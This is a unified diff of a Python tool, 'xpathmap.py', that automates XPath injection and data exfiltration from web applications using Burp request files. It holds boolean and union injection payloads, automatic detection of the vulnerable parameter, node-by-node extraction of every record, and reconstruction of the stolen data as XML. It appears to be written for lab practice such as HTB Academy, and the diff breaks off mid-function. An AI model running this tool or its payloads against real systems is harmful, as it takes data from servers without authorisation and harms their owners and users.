@@ -1,21 +1,23 @@
 #!/usr/bin/env python3
 """
 xpathmap.py — Automated XPath Injection & Data Exfiltration Tool
-Inspired by sqlmap. Reads a raw Burp Suite HTTP request file.
+Reads raw Burp Suite HTTP request files.
 
 Usage:
     python xpathmap.py -r request.txt
-    python xpathmap.py -r request.txt -v                          # verbose debug output
-    python xpathmap.py -r request.txt --method predicate
-    python xpathmap.py -r request.txt --proxy http://127.0.0.1:8080
-    python xpathmap.py -r request.txt --injectable-param q --node-param f
+    python xpathmap.py -r request.txt -v
     python xpathmap.py -r request.txt --injectable-param q --node-param f --field streetname
+    python xpathmap.py -r request.txt --xml output.xml
+    python xpathmap.py -r request.txt --proxy http://127.0.0.1:8080
 """
 
 import argparse
+import difflib
 import re
 import sys
 import time
+import xml.dom.minidom
+import xml.etree.ElementTree as ET
 from dataclasses import dataclass, field as dc_field
 from typing import Optional
 from urllib.parse import urlparse, parse_qs
@@ -26,14 +28,14 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Global verbose flag (set after arg parse)
+# Globals
 # ──────────────────────────────────────────────────────────────────────────────
 
 VERBOSE = False
 
 
 # ──────────────────────────────────────────────────────────────────────────────
-# ANSI colors & logging helpers
+# Colors & logging
 # ──────────────────────────────────────────────────────────────────────────────
 
 class C:
@@ -65,8 +67,8 @@ class ParsedRequest:
     method: str
     url: str
     headers: dict
-    params: dict       # GET query params  {name: value}
-    body_params: dict  # POST body params  {name: value}
+    params: dict
+    body_params: dict
     raw_body: str
 
     @property
@@ -75,7 +77,6 @@ class ParsedRequest:
 
 
 def parse_burp_request(filepath: str) -> ParsedRequest:
-    """Parse a raw HTTP request file exported from Burp Suite."""
     with open(filepath, "r", errors="replace") as fh:
         content = fh.read()
 
@@ -84,7 +85,6 @@ def parse_burp_request(filepath: str) -> ParsedRequest:
         error("Request file is empty.")
         sys.exit(1)
 
-    # --- First line: METHOD /path?query HTTP/1.x ---
     request_line = lines[0].strip()
     match = re.match(
         r"^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+(\S+)\s+HTTP/[\d.]+$",
@@ -97,7 +97,6 @@ def parse_burp_request(filepath: str) -> ParsedRequest:
     http_method    = match.group(1).upper()
     path_and_query = match.group(2)
 
-    # --- Headers (lines 1..N until blank line) ---
     headers: dict[str, str] = {}
     host = ""
     i = 1
@@ -109,34 +108,170 @@ def parse_burp_request(filepath: str) -> ParsedRequest:
                 host = val.strip()
         i += 1
 
-    # --- Body (everything after the blank line) ---
     raw_body = "\n".join(lines[i + 1:]).strip() if i < len(lines) else ""
 
-    # --- Determine scheme from Referer header (fallback: http) ---
-    scheme  = "https" if headers.get("Referer", "").startswith("https") else "http"
+    scheme   = "https" if headers.get("Referer", "").startswith("https") else "http"
     full_url = f"{scheme}://{host}{path_and_query}"
 
     parsed = urlparse(full_url)
     params = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}
 
-    # --- POST form-encoded body ---
     body_params: dict[str, str] = {}
     if raw_body and "application/x-www-form-urlencoded" in headers.get("Content-Type", ""):
         body_params = {k: v[0] for k, v in parse_qs(raw_body, keep_blank_values=True).items()}
 
-    # Remove headers that break response decoding or cause caching issues
     for h in ("Accept-Encoding", "Content-Length", "If-None-Match", "If-Modified-Since"):
         headers.pop(h, None)
 
     base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
     return ParsedRequest(
-        method=http_method,
-        url=base_url,
-        headers=headers,
-        params=params,
-        body_params=body_params,
-        raw_body=raw_body,
+        method=http_method, url=base_url, headers=headers,
+        params=params, body_params=body_params, raw_body=raw_body,
     )
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# Response value extractor
+# ──────────────────────────────────────────────────────────────────────────────
+
+class ResponseExtractor:
+    """
+    Figures out how to extract the injected data value from an HTML response.
+
+    Strategy (in order):
+      1. Diff against a known-empty "null baseline" — lines/words that appear
+         only in the data response but not in the baseline are the result.
+      2. Regex patterns commonly used in CTF / lab apps.
+      3. Strip all HTML tags and return plain text (last resort).
+
+    The extractor is calibrated once by calling .calibrate(null_html, data_html, known_value).
+    After calibration it can reliably parse any future response.
+    """
+
+    # Patterns to try if diff fails (ordered by specificity)
+    RESULT_PATTERNS = [
+        # Results block with <br> before value
+        r"<b>Results:</b><br\s*/?><br\s*/?>\s*(.+?)\s*</center>",
+        r"<b>Results?:?</b>\s*<br\s*/?>\s*(.+?)\s*(?:</center>|</div>|</p>)",
+        # Generic: value after last <br> before </center> or </div>
+        r"<br\s*/?>\s*([^<]{1,200}?)\s*</center>",
+        r"<br\s*/?>\s*([^<]{1,200}?)\s*</div>",
+        # Value in a <td> or <span> or <p>
+        r"<td[^>]*>\s*([^<]{1,200}?)\s*</td>",
+        r"<span[^>]*>\s*([^<]{1,200}?)\s*</span>",
+        r"<p[^>]*>\s*([^<]{1,200}?)\s*</p>",
+    ]
+
+    NO_DATA_MARKERS = [
+        "no results", "no result", "not found", "0 results",
+        "nothing found", "empty", "keine ergebnisse",
+    ]
+
+    def __init__(self):
+        self._mode: str = "regex"          # "diff" | "regex" | "strip"
+        self._diff_anchor: str = ""        # stable null-baseline for diffing
+        self._regex: Optional[str] = None  # chosen regex pattern
+        self._null_stripped: str = ""      # stripped text of null response
+
+    def calibrate(self, null_html: str, data_html: str, known_value: str) -> bool:
+        """
+        Try to find extraction method that recovers `known_value` from `data_html`
+        given that `null_html` is the empty/no-data response.
+        Returns True on success.
+        """
+        debug(f"Calibrating extractor (known_value={known_value!r})")
+        self._null_stripped = self._strip_html(null_html)
+
+        # --- Strategy 1: diff ---
+        diff_result = self._diff_extract(null_html, data_html)
+        if diff_result and known_value.strip().lower() in diff_result.strip().lower():
+            self._mode = "diff"
+            self._diff_anchor = null_html
+            success(f"Extractor mode: diff  (found {known_value!r} in diff)")
+            return True
+
+        # --- Strategy 2: regex patterns ---
+        for pattern in self.RESULT_PATTERNS:
+            m = re.search(pattern, data_html, re.IGNORECASE | re.DOTALL)
+            if m:
+                extracted = m.group(1).strip()
+                if known_value.strip().lower() in extracted.lower():
+                    self._mode   = "regex"
+                    self._regex  = pattern
+                    success(f"Extractor mode: regex  pattern={pattern[:60]!r}")
+                    return True
+
+        # --- Strategy 3: plain text diff ---
+        stripped = self._strip_html(data_html)
+        plain_diff = self._text_diff(self._null_stripped, stripped)
+        if known_value.strip().lower() in plain_diff.lower():
+            self._mode = "strip_diff"
+            self._null_stripped = self._strip_html(null_html)
+            success("Extractor mode: stripped-text diff")
+            return True
+
+        warn(f"Could not calibrate extractor for value {known_value!r} — will use best-effort")
+        self._mode = "strip_diff"
+        return False
+
+    def extract(self, html: str) -> Optional[str]:
+        """Extract the data value from an HTML response. Returns None if no data."""
+        if self._is_no_data(html):
+            return None
+
+        if self._mode == "diff":
+            val = self._diff_extract(self._diff_anchor, html)
+        elif self._mode == "regex" and self._regex:
+            m = re.search(self._regex, html, re.IGNORECASE | re.DOTALL)
+            val = m.group(1).strip() if m else None
+        else:
+            # strip_diff or fallback
+            stripped = self._strip_html(html)
+            val = self._text_diff(self._null_stripped, stripped) or None
+
+        if val:
+            val = val.strip()
+            # Sanity: skip if it looks like HTML leaked through
+            if "<" in val and ">" in val:
+                val = self._strip_html(val).strip()
+            return val if val else None
+        return None
+
+    # ── Internals ──────────────────────────────────────────────────────────────
+
+    def _is_no_data(self, html: str) -> bool:
+        low = html.lower()
+        return any(m in low for m in self.NO_DATA_MARKERS)
+
+    @staticmethod
+    def _strip_html(html: str) -> str:
+        """Remove all HTML tags and collapse whitespace."""
+        text = re.sub(r"<[^>]+>", " ", html)
+        text = re.sub(r"\s+", " ", text)
+        return text.strip()
+
+    @staticmethod
+    def _diff_extract(base: str, new: str) -> str:
+        """Return lines/words present in `new` but not in `base`."""
+        base_lines = base.splitlines()
+        new_lines  = new.splitlines()
+        added = []
+        for line in difflib.ndiff(base_lines, new_lines):
+            if line.startswith("+ "):
+                content = line[2:].strip()
+                # Skip lines that are just HTML structure (tags only, no text)
+                text_only = re.sub(r"<[^>]+>", "", content).strip()
+                if text_only:
+                    added.append(text_only)
+        return " ".join(added).strip()
+
+    @staticmethod
+    def _text_diff(base: str, new: str) -> str:
+        """Diff on plain-text level."""
+        base_words = set(base.split())
+        new_words  = new.split()
+        unique = [w for w in new_words if w not in base_words]
+        return " ".join(unique).strip()
 
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -158,16 +293,13 @@ class Engine:
         self.session.verify = False
 
     def send(self, override_params: dict) -> str:
-        """Merge override_params on top of original params and fire the request."""
         params = {**self.req.params, **override_params}
         body   = dict(self.req.body_params)
-
-        debug(f"→ params={params}")
+        debug(f"→ {params}")
         try:
             if self.req.method == "GET":
                 resp = self.session.get(self.req.url, params=params, timeout=self.timeout)
             else:
-                # Inject into POST body where the key already exists; otherwise query string
                 for k in override_params:
                     if k in body:
                         body[k] = override_params[k]
@@ -176,7 +308,7 @@ class Engine:
                 )
             time.sleep(self.delay)
             text = resp.text.strip()
-            debug(f"← HTTP {resp.status_code}  len={len(text)}  preview={text[:120]!r}")
+            debug(f"← {resp.status_code}  len={len(text)}  {text[:100]!r}")
             return text
         except requests.RequestException as e:
             warn(f"Request error: {e}")
@@ -184,10 +316,9 @@ class Engine:
 
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Injection detection payloads
+# Injection detection
 # ──────────────────────────────────────────────────────────────────────────────
 
-# Close the contains() predicate and append a universally FALSE condition
 NULL_PAYLOADS = [
     "') and ('1'='2",
     "' and '1'='2",
@@ -195,27 +326,23 @@ NULL_PAYLOADS = [
     '\") and (\"1\"=\"2',
 ]
 
-# Close the predicate and append a universally TRUE condition
 TRUE_PAYLOADS = [
     "') or ('1'='1",
     "' or '1'='1",
     '\") or (\"1\"=\"1',
 ]
 
-
-def _has_data(text: str) -> bool:
-    """Heuristic: text is non-empty and doesn't look like a server error page."""
-    if not text:
-        return False
-    low = text.lower()
-    bad = ("xpath error", "parse error", "syntax error",
-           "invalid expression", "500 internal", "error on line")
-    return not any(kw in low for kw in bad)
+NO_DATA_MARKERS = ["no results", "no result", "not found", "nothing found"]
 
 
-# ──────────────────────────────────────────────────────────────────────────────
-# Auto-detection: injectable param & null payload
-# ──────────────────────────────────────────────────────────────────────────────
+def _seems_empty(html: str) -> bool:
+    low = html.lower()
+    return any(m in low for m in NO_DATA_MARKERS) or not html.strip()
+
+
+def _seems_has_data(html: str) -> bool:
+    return bool(html.strip()) and not _seems_empty(html)
+
 
 def detect_injectable_param(
     engine: Engine,
@@ -223,70 +350,43 @@ def detect_injectable_param(
     node_param: Optional[str] = None,
     node_field: Optional[str] = None,
 ) -> tuple[Optional[str], Optional[str]]:
-    """
-    Find which parameter is injectable by testing null/true payload pairs.
-
-    Three strategies (in order):
-      1. Classic: null payload → empty, true payload → data
-      2. Diff-based: null and true responses differ (handles pre-empty baseline)
-      3. Union probe: inject a union subquery into the node param alongside the
-         null payload and check whether we get data back
-    """
     info("Auto-detecting injectable parameter...")
-
-    baseline     = engine.send({})
-    baseline_len = len(baseline)
-    debug(f"Baseline len={baseline_len}  preview={baseline[:100]!r}")
+    baseline = engine.send({})
+    debug(f"Baseline len={len(baseline)}")
 
     for param in candidates:
-        debug(f"Testing param '{param}'...")
         for null_pay in NULL_PAYLOADS:
             null_resp = engine.send({param: null_pay})
-
             for true_pay in TRUE_PAYLOADS:
                 true_resp = engine.send({param: true_pay})
+                null_empty = _seems_empty(null_resp)
+                true_has   = _seems_has_data(true_resp)
+                debug(f"  {param!r}  null_empty={null_empty}  true_has={true_has}")
 
-                null_ok = _has_data(null_resp)
-                true_ok = _has_data(true_resp)
-                debug(
-                    f"  null={null_pay!r:30s} data={null_ok} len={len(null_resp)} | "
-                    f"true={true_pay!r:25s} data={true_ok} len={len(true_resp)}"
-                )
-
-                # Strategy 1: classic boolean contrast
-                if not null_ok and true_ok:
-                    success(f"Injectable param (boolean): '{param}'")
-                    success(f"Null payload: {null_pay!r}")
+                if null_empty and true_has:
+                    success(f"Injectable param (boolean): '{param}'  payload={null_pay!r}")
                     return param, null_pay
 
-                # Strategy 2: responses differ even if both empty/non-empty
-                if null_resp != true_resp and abs(len(null_resp) - len(true_resp)) > 5:
-                    if not null_ok or len(null_resp) < len(true_resp):
-                        success(f"Injectable param (diff-based): '{param}'")
-                        success(f"Null payload: {null_pay!r}")
+                if null_resp != true_resp and abs(len(null_resp) - len(true_resp)) > 10:
+                    if null_empty or len(null_resp) < len(true_resp):
+                        success(f"Injectable param (diff): '{param}'  payload={null_pay!r}")
                         return param, null_pay
 
-    # Strategy 3: union probe (works when the search term never returns data)
+    # Union probe fallback
     if node_param and node_field:
-        info("Trying union probe as fallback detection strategy...")
+        info("Trying union probe fallback...")
         for param in candidates:
             for null_pay in NULL_PAYLOADS:
                 for depth in range(2, 6):
-                    path      = "".join("/*[1]" for _ in range(depth))
-                    union_val = f"{node_field} | {path}"
-                    resp = engine.send({param: null_pay, node_param: union_val})
-                    debug(f"  union probe depth={depth} → {resp[:80]!r}")
-                    if _has_data(resp):
-                        success(f"Injectable param (union probe): '{param}'")
-                        success(f"Null payload: {null_pay!r}")
+                    path  = "".join("/*[1]" for _ in range(depth))
+                    probe = f"{node_field} | {path}"
+                    resp  = engine.send({param: null_pay, node_param: probe})
+                    if _seems_has_data(resp):
+                        success(f"Injectable param (union probe): '{param}'  payload={null_pay!r}")
                         return param, null_pay
 
     return None, None
 
-
-# ──────────────────────────────────────────────────────────────────────────────
-# Auto-detection: node-selection parameter
-# ──────────────────────────────────────────────────────────────────────────────
 
 def detect_node_param(
     engine: Engine,
@@ -294,55 +394,43 @@ def detect_node_param(
     null_pay: str,
     candidates: list[str],
 ) -> tuple[Optional[str], Optional[str]]:
-    """
-    Find the parameter that controls XPath node selection (e.g. the 'f' param).
-
-    We inject a union subquery at increasing depths; if the response changes
-    compared to the null baseline, that parameter is the node-selection one.
-    """
     info("Auto-detecting node-selection parameter...")
-
     null_baseline = engine.send({inj_param: null_pay})
-    debug(f"Null baseline len={len(null_baseline)}  preview={null_baseline[:80]!r}")
 
     for param in candidates:
         original = engine.req.params.get(param) or engine.req.body_params.get(param, "")
         if not original:
             continue
-
         for depth in range(2, 6):
             path  = "".join("/*[1]" for _ in range(depth))
             probe = f"{original} | {path}"
             resp  = engine.send({inj_param: null_pay, param: probe})
-            debug(f"  '{param}' depth={depth}  len={len(resp)}  {resp[:80]!r}")
-
-            if _has_data(resp) and resp != null_baseline:
-                success(f"Node-selection param: '{param}'  (field='{original}')")
+            if _seems_has_data(resp) and resp != null_baseline:
+                success(f"Node-selection param: '{param}'  field='{original}'")
                 return param, original
-
     return None, None
 
 
-def get_baseline_field(engine: Engine, node_param: str) -> Optional[str]:
-    """Return the current value of the node-selection parameter (the XPath field name)."""
+def get_field_from_param(engine: Engine, node_param: str) -> Optional[str]:
     val = engine.req.params.get(node_param) or engine.req.body_params.get(node_param, "")
     return val.strip() or None
 
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Node-selection exfiltration
+# XPath traversal — Node Selection
 # ──────────────────────────────────────────────────────────────────────────────
 
 def build_path(indices: list[int]) -> str:
     return "".join(f"/*[{i}]" for i in indices)
 
 
-def probe_node(
+def probe_raw(
     engine: Engine,
     inj_param: str, null_pay: str,
     node_param: str, field_name: str,
     indices: list[int],
 ) -> str:
+    """Returns raw HTML for a node probe."""
     path    = build_path(indices)
     f_value = f"{field_name} | {path}"
     return engine.send({inj_param: null_pay, node_param: f_value})
@@ -353,22 +441,23 @@ def detect_depth(
     inj_param: str, null_pay: str,
     node_param: str, field_name: str,
     dataset_idx: int,
+    extractor: ResponseExtractor,
     max_depth: int = 8,
-) -> Optional[int]:
+) -> tuple[Optional[int], Optional[str]]:
     """
-    Probe /*[1]/*[dataset_idx]/*[1]*N until a non-empty response is returned.
-    The total number of /*[N] components is the schema depth for this dataset.
+    Returns (depth, sample_value) — the depth at which we first get data,
+    and the extracted sample value (used for calibration).
     """
     base = [1, dataset_idx]
     for extra in range(1, max_depth + 1):
         indices = base + [1] * extra
-        resp    = probe_node(engine, inj_param, null_pay, node_param, field_name, indices)
-        debug(f"  depth probe {build_path(indices)} → {resp[:60]!r}")
-        if _has_data(resp):
-            depth = len(indices)
-            info(f"    Schema depth: {depth}  (sample: '{resp[:60]}')")
-            return depth
-    return None
+        raw     = probe_raw(engine, inj_param, null_pay, node_param, field_name, indices)
+        val     = extractor.extract(raw)
+        debug(f"  depth probe {build_path(indices)} → {val!r}")
+        if val is not None:
+            info(f"    Schema depth: {len(indices)}  sample='{val}'")
+            return len(indices), val
+    return None, None
 
 
 def exfiltrate_record(
@@ -376,18 +465,17 @@ def exfiltrate_record(
     inj_param: str, null_pay: str,
     node_param: str, field_name: str,
     base_indices: list[int],
+    extractor: ResponseExtractor,
     max_fields: int = 20,
 ) -> list[str]:
-    """Extract all fields of one record by incrementing the last index position."""
     values: list[str] = []
     for field_idx in range(1, max_fields + 1):
-        resp = probe_node(
-            engine, inj_param, null_pay, node_param, field_name,
-            base_indices + [field_idx],
-        )
-        if not _has_data(resp):
+        raw = probe_raw(engine, inj_param, null_pay, node_param, field_name,
+                        base_indices + [field_idx])
+        val = extractor.extract(raw)
+        if val is None:
             break
-        values.append(resp)
+        values.append(val)
     return values
 
 
@@ -396,23 +484,23 @@ def exfiltrate_dataset(
     inj_param: str, null_pay: str,
     node_param: str, field_name: str,
     dataset_idx: int,
+    extractor: ResponseExtractor,
     max_depth: int, max_records: int, max_fields: int,
 ) -> list[list[str]]:
-    """Iterate over all records in one dataset node."""
     print()
     info(f"Scanning dataset /*[1]/*[{dataset_idx}] ...")
 
-    depth = detect_depth(
-        engine, inj_param, null_pay, node_param, field_name, dataset_idx, max_depth
+    depth, _ = detect_depth(
+        engine, inj_param, null_pay, node_param, field_name,
+        dataset_idx, extractor, max_depth,
     )
     if depth is None:
         warn(f"    Dataset /*[1]/*[{dataset_idx}] not found or empty.")
         return []
 
-    # Path layout: [1, dataset_idx, <intermediate /*[1] × (depth-3)>, record_idx]
     n_intermediate = depth - 3
     if n_intermediate < 0:
-        warn("    Depth too shallow to extract records.")
+        warn("    Depth too shallow.")
         return []
 
     intermediate = [1] * n_intermediate
@@ -421,7 +509,8 @@ def exfiltrate_dataset(
     for rec_idx in range(1, max_records + 1):
         base   = [1, dataset_idx] + intermediate + [rec_idx]
         record = exfiltrate_record(
-            engine, inj_param, null_pay, node_param, field_name, base, max_fields
+            engine, inj_param, null_pay, node_param, field_name,
+            base, extractor, max_fields,
         )
         if not record:
             info(f"    End of records at index {rec_idx}.")
@@ -436,21 +525,49 @@ def run_node_selection(
     engine: Engine,
     inj_param: str, null_pay: str,
     node_param: str, field_name: str,
+    extractor: ResponseExtractor,
     max_datasets: int, max_depth: int,
     max_records: int, max_fields: int,
 ) -> dict[int, list[list[str]]]:
-    """Walk every dataset in the XML document using node-selection injection."""
-    info(
-        f"Node-selection exfiltration | "
-        f"inj='{inj_param}'  node='{node_param}'  field='{field_name}'"
-    )
+    info(f"Node-selection | inj='{inj_param}' node='{node_param}' field='{field_name}'")
+
+    # ── Calibrate extractor ───────────────────────────────────────────────────
+    info("Calibrating response extractor...")
+    null_html = engine.send({inj_param: null_pay})
+
+    # Find first data response for calibration (depth probe on dataset 1)
+    calibrated = False
+    for ds in range(1, 4):
+        for extra in range(1, max_depth + 1):
+            indices  = [1, ds] + [1] * extra
+            data_html = probe_raw(engine, inj_param, null_pay, node_param, field_name, indices)
+            # Try to extract with regex first to get known_value for calibration
+            for pattern in ResponseExtractor.RESULT_PATTERNS:
+                m = re.search(pattern, data_html, re.IGNORECASE | re.DOTALL)
+                if m:
+                    known = m.group(1).strip()
+                    if known and "no result" not in known.lower() and len(known) < 200:
+                        extractor.calibrate(null_html, data_html, known)
+                        calibrated = True
+                        break
+            if calibrated:
+                break
+        if calibrated:
+            break
+
+    if not calibrated:
+        warn("Could not calibrate — will use best-effort extraction")
+        extractor._mode = "strip_diff"
+        extractor._null_stripped = ResponseExtractor._strip_html(null_html)
+
+    # ── Exfiltrate ────────────────────────────────────────────────────────────
     all_data: dict[int, list[list[str]]] = {}
     consecutive_empty = 0
 
     for ds_idx in range(1, max_datasets + 1):
         records = exfiltrate_dataset(
             engine, inj_param, null_pay, node_param, field_name,
-            ds_idx, max_depth, max_records, max_fields,
+            ds_idx, extractor, max_depth, max_records, max_fields,
         )
         if records:
             all_data[ds_idx] = records
@@ -458,36 +575,43 @@ def run_node_selection(
         else:
             consecutive_empty += 1
             if consecutive_empty >= 2:
-                info("Two consecutive empty datasets — stopping scan.")
+                info("Two consecutive empty datasets — stopping.")
                 break
 
     return all_data
 
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Predicate (position-based) exfiltration
+# Predicate method
 # ──────────────────────────────────────────────────────────────────────────────
 
 def run_predicate(
     engine: Engine,
     inj_param: str,
+    extractor: ResponseExtractor,
+    null_pay: str,
     step: int,
     max_records: int,
 ) -> list[str]:
-    """Paginate results by incrementing the position() threshold."""
-    info(f"Predicate exfiltration via position() | param='{inj_param}'  step={step}")
+    info(f"Predicate exfiltration via position() | param='{inj_param}' step={step}")
+
+    null_html = engine.send({inj_param: null_pay})
+    extractor._null_stripped = ResponseExtractor._strip_html(null_html)
+    extractor._mode = "strip_diff"
+
     results: list[str] = []
     position = 0
 
     while position < max_records:
         payload = f"') and (position()>{position}) and ('1'='1"
-        resp    = engine.send({inj_param: payload})
+        raw     = engine.send({inj_param: payload})
+        val     = extractor.extract(raw)
 
-        if not _has_data(resp):
+        if val is None:
             info(f"    No data at position()>{position}. Done.")
             break
 
-        batch = [ln.strip() for ln in resp.splitlines() if ln.strip()]
+        batch = [v.strip() for v in val.split() if v.strip()]
         results.extend(batch)
         found(f"position()>{position}: {batch}")
         position += step
@@ -496,10 +620,69 @@ def run_predicate(
 
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Final output
+# XML reconstruction
 # ──────────────────────────────────────────────────────────────────────────────
 
-def print_summary(data):
+def build_xml(data: dict[int, list[list[str]]], field_name: str) -> str:
+    """
+    Reconstruct an XML document from the extracted data.
+    Node names are inferred where possible; otherwise generic names are used.
+
+    Structure mirrors what we traversed:
+      <root>
+        <dataset_1>
+          <record>
+            <field_1>value</field_1>
+            ...
+          </record>
+        </dataset_1>
+        <dataset_2>
+          ...
+        </dataset_2>
+      </root>
+    """
+    root = ET.Element("root")
+
+    for ds_idx, records in data.items():
+        # If only one dataset and we know the field name, use it as context
+        ds_tag = f"dataset_{ds_idx}"
+        ds_el  = ET.SubElement(root, ds_tag)
+
+        # Try to guess field names from the first record + known field_name
+        # Field index 1 usually corresponds to the field_name we queried
+        n_fields = max((len(r) for r in records), default=0)
+        field_names: list[str] = []
+        for fi in range(n_fields):
+            if fi == 0 and field_name and field_name not in ("text()", ""):
+                field_names.append(field_name)
+            else:
+                field_names.append(f"field_{fi + 1}")
+
+        for rec_idx, record in enumerate(records, 1):
+            rec_el = ET.SubElement(ds_el, "record")
+            rec_el.set("index", str(rec_idx))
+            for fi, value in enumerate(record):
+                fname  = field_names[fi] if fi < len(field_names) else f"field_{fi + 1}"
+                f_el   = ET.SubElement(rec_el, fname)
+                f_el.text = value
+
+    # Pretty-print
+    raw_xml = ET.tostring(root, encoding="unicode")
+    try:
+        pretty = xml.dom.minidom.parseString(raw_xml).toprettyxml(indent="  ")
+        # Remove the <?xml ...?> declaration line minidom adds
+        lines  = pretty.splitlines()
+        pretty = "\n".join(lines[1:])
+        return pretty
+    except Exception:
+        return raw_xml
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# Output
+# ──────────────────────────────────────────────────────────────────────────────
+
+def print_summary(data, xml_str: Optional[str] = None):
     print()
     print(f"{C.BOLD}{'='*60}{C.RESET}")
     print(f"{C.BOLD}  EXTRACTION RESULTS{C.RESET}")
@@ -518,6 +701,12 @@ def print_summary(data):
         print(f"  {'-'*50}")
         for i, item in enumerate(data, 1):
             print(f"    [{i:>3}]  {item}")
+
+    if xml_str:
+        print(f"\n{C.CYAN}{'─'*60}{C.RESET}")
+        print(f"{C.CYAN}  RECONSTRUCTED XML{C.RESET}")
+        print(f"{C.CYAN}{'─'*60}{C.RESET}")
+        print(xml_str)
 
     print(f"{C.BOLD}{'='*60}{C.RESET}")
 
@@ -546,25 +735,25 @@ def parse_args():
     p.add_argument("-v", "--verbose", action="store_true",
                    help="Print every request/response for debugging")
     p.add_argument("--method", choices=["auto", "node_selection", "predicate"],
-                   default="auto",
-                   help="Injection method (default: auto)")
+                   default="auto")
     p.add_argument("--injectable-param", default=None,
-                   help="Force injectable parameter name (e.g. q)")
+                   help="Force injectable parameter (e.g. q)")
     p.add_argument("--node-param", default=None,
-                   help="Force node-selection parameter name (e.g. f)")
+                   help="Force node-selection parameter (e.g. f)")
     p.add_argument("--field", default=None,
-                   help="XPath field name used in node param (e.g. streetname)")
+                   help="XPath field name in node param (e.g. streetname)")
     p.add_argument("--null-payload", default=None,
                    help="Force null payload string")
+    p.add_argument("--xml", default=None, metavar="FILE",
+                   help="Save reconstructed XML to file")
     p.add_argument("--delay",          type=float, default=0.1)
-    p.add_argument("--proxy",          default=None,
-                   help="HTTP proxy (e.g. http://127.0.0.1:8080)")
-    p.add_argument("--timeout",        type=int, default=15)
-    p.add_argument("--max-datasets",   type=int, default=6)
-    p.add_argument("--max-depth",      type=int, default=8)
-    p.add_argument("--max-records",    type=int, default=200)
-    p.add_argument("--max-fields",     type=int, default=20)
-    p.add_argument("--predicate-step", type=int, default=5)
+    p.add_argument("--proxy",          default=None)
+    p.add_argument("--timeout",        type=int,   default=15)
+    p.add_argument("--max-datasets",   type=int,   default=6)
+    p.add_argument("--max-depth",      type=int,   default=8)
+    p.add_argument("--max-records",    type=int,   default=500)
+    p.add_argument("--max-fields",     type=int,   default=20)
+    p.add_argument("--predicate-step", type=int,   default=5)
     return p.parse_args()
 
 
@@ -575,7 +764,6 @@ def main():
     args    = parse_args()
     VERBOSE = args.verbose
 
-    # ── Parse Burp request file ───────────────────────────────────────────────
     info(f"Loading request: {args.request}")
     req = parse_burp_request(args.request)
     info(f"Target  : {req.url}")
@@ -583,98 +771,92 @@ def main():
     info(f"Params  : {list(req.all_params.keys())}")
 
     if not req.all_params:
-        error("No parameters found in the request. Cannot inject.")
+        error("No parameters found.")
         sys.exit(1)
 
     proxies    = {"http": args.proxy, "https": args.proxy} if args.proxy else None
     engine     = Engine(req=req, delay=args.delay, proxies=proxies, timeout=args.timeout)
     all_params = list(req.all_params.keys())
 
-    # ── Resolve injectable param & null payload ───────────────────────────────
+    # ── Resolve injectable param ──────────────────────────────────────────────
     inj_param:  Optional[str] = args.injectable_param
     null_pay:   Optional[str] = args.null_payload
     node_param: Optional[str] = args.node_param
     field_name: Optional[str] = args.field
 
     if inj_param and null_pay:
-        # Everything forced — skip all detection
-        success(f"Using forced injectable='{inj_param}'  payload={null_pay!r}")
-
-    elif inj_param and not null_pay:
-        # Param is known; detect the best null payload.
-        # Pass node_param / field hints so union-probe fallback can work.
+        success(f"Using forced: inj='{inj_param}'  payload={null_pay!r}")
+    elif inj_param:
         node_hint  = node_param or next((p for p in all_params if p != inj_param), None)
-        field_hint = field_name or (get_baseline_field(engine, node_hint) if node_hint else None)
+        field_hint = field_name or (get_field_from_param(engine, node_hint) if node_hint else None)
         _, null_pay = detect_injectable_param(
-            engine, [inj_param],
-            node_param=node_hint,
-            node_field=field_hint,
+            engine, [inj_param], node_param=node_hint, node_field=field_hint
         )
         if not null_pay:
-            # Hard fallback to the canonical payload from the HTB Academy chapter
-            warn("Could not auto-detect null payload — using canonical: ') and ('1'='2")
+            warn("Could not detect null payload — using canonical: ') and ('1'='2")
             null_pay = "') and ('1'='2"
-
     else:
-        # Full auto-detection of both param and payload
         node_hint  = node_param or next((p for p in all_params if p != all_params[0]), None)
-        field_hint = field_name or (get_baseline_field(engine, node_hint) if node_hint else None)
+        field_hint = field_name or (get_field_from_param(engine, node_hint) if node_hint else None)
         inj_param, null_pay = detect_injectable_param(
-            engine, all_params,
-            node_param=node_hint,
-            node_field=field_hint,
+            engine, all_params, node_param=node_hint, node_field=field_hint
         )
         if not inj_param:
             error(
-                "Could not auto-detect injectable parameter.\n\n"
-                "  Run with -v to see raw responses, then provide hints:\n"
-                "    --injectable-param q --node-param f --field streetname\n"
-                "  Or force everything:\n"
-                "    --injectable-param q --null-payload \"') and ('1'='2\"\n"
+                "Could not auto-detect injectable parameter.\n"
+                "  Try: --injectable-param q --node-param f --field streetname\n"
+                "  Or add -v for debug output."
             )
             sys.exit(1)
 
-    # ── Choose method ─────────────────────────────────────────────────────────
+    # ── Resolve method ────────────────────────────────────────────────────────
     method = args.method
     if method == "auto":
         remaining = [p for p in all_params if p != inj_param]
         method    = "node_selection" if remaining else "predicate"
-        info(f"Method auto-selected: {C.BOLD}{method}{C.RESET}")
+        info(f"Method: {C.BOLD}{method}{C.RESET}")
 
-    # ── Resolve node param & field name (for node_selection) ──────────────────
+    # ── Resolve node param ────────────────────────────────────────────────────
     if method == "node_selection":
         if not node_param:
             remaining = [p for p in all_params if p != inj_param]
             if not remaining:
-                warn("No second parameter available — switching to predicate method.")
+                warn("No second parameter — switching to predicate.")
                 method = "predicate"
             else:
                 node_param, _ = detect_node_param(engine, inj_param, null_pay, remaining)
                 if not node_param:
                     node_param = remaining[0]
-                    warn(f"Could not confirm node param — assuming '{node_param}'")
+                    warn(f"Assuming node param: '{node_param}'")
 
         if method == "node_selection" and not field_name:
-            field_name = get_baseline_field(engine, node_param) if node_param else None
-            if field_name:
-                info(f"Field name auto-detected: '{field_name}'")
-            else:
-                field_name = "text()"
